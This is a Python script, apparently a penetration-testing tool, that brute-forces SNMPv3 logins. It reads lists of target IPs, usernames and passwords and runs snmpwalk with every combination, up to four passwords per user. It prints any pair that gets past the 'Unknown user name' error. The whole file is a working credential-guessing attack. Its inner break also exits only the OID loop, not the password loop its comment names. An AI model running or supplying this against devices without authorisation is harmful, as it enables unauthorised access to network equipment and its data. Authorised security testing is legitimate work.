import subprocess

# File paths
usernames_file = "/home/kali/tools/snmpwn/users.txt"
passwords_file = "/home/kali/tools/snmpwn/passwords.txt"
ip_list_file = "/home/kali/tools/snmpwn/ips.txt"
attempt_limit = 4

# Commonly used OIDs
oids = ["1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1.1.3.0", "1.3.6.1.2.1.1.5.0"]  # sysDescr, sysUpTime, sysName

def run_snmpwalk(username, password, ip, oid):
    try:
        response = subprocess.check_output(
            ["snmpwalk", "-v3", "-u", username, "-l", "authNoPriv", "-a", "MD5", "-A", password, ip, oid],
            stderr=subprocess.STDOUT
        ).decode('utf-8')
        return response.strip()
    except subprocess.CalledProcessError as e:
        return e.output.decode('utf-8')

with open(ip_list_file, 'r') as ip_list:
    for ip in ip_list:
        ip = ip.strip()
        print(f"Testing IP: {ip}")
        username_count = 0

        with open(usernames_file, 'r') as usernames:
            for username in usernames:
                username = username.strip()
                username_count += 1
                attempt_count = 0

                with open(passwords_file, 'r') as passwords:
                    for password in passwords:
                        password = password.strip()
                        attempt_count += 1
                        if attempt_count > attempt_limit:
                            break

                        for oid in oids:
                            response = run_snmpwalk(username, password, ip, oid)
                            if 'Unknown user name' not in response:
                                print(f"Attempt {attempt_count} for {username} with password: {password}")
                                print(f"Querying OID {oid}")
                                print(response)
                                break  # If a valid response is found, exit the password loop

        print(f"Total usernames attempted for IP {ip}: {username_count}")